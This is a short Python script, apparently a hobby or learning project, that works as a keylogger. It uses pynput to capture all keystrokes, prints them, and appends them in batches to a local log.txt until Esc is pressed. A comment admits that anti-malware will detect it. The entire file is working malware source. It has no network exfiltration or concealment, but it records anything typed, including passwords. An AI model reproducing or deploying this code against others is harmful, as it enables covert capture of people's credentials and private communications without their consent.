import pynput
from pynput.keyboard import Key, Listener

# REMINDER
# Your anti-malware will detect this file if you run it on your system
# if you do not have a log.txt file, create one and
# put it in alongside this program

c = 0

keys = []

def press_key(key):
    global keys, c

    keys.append(key)
    c += 1

    print(key)

    if c >= 5:
        c = 0
        f_write(keys)
        keys = []

def release_key(key):
    if key == Key.esc:
        return False

def f_write(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")

            elif k.find("Key") == -1:
                f.write(k)

with Listener(on_press = press_key, on_release = release_key) as listener:
    listener.join()